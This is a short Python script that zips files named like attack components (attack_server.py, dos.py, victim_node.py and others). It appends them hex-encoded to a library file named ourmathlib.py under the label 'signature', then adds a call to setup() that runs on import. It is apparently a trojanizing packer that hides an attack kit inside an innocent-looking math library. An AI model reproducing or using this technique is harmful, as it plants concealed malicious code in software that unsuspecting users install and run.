import subprocess

payload_files = [
    'attack_server.py',
    'dos.py',
    'messenger.py',
    'setup.py',
    'encryption.py',
    'victim_node.py'
]

subprocess.call('zip tmp.zip ' + ' '.join(payload_files), shell=True)

with open('tmp.zip', 'r') as f:
    raw = f.read()

subprocess.call('rm -rf tmp.zip', shell=True)

with open('ourmathlib/ourmathlib.py', 'a') as f:
    f.write('\nsignature = \'' + raw.encode('hex') + '\'\nsetup()\n')
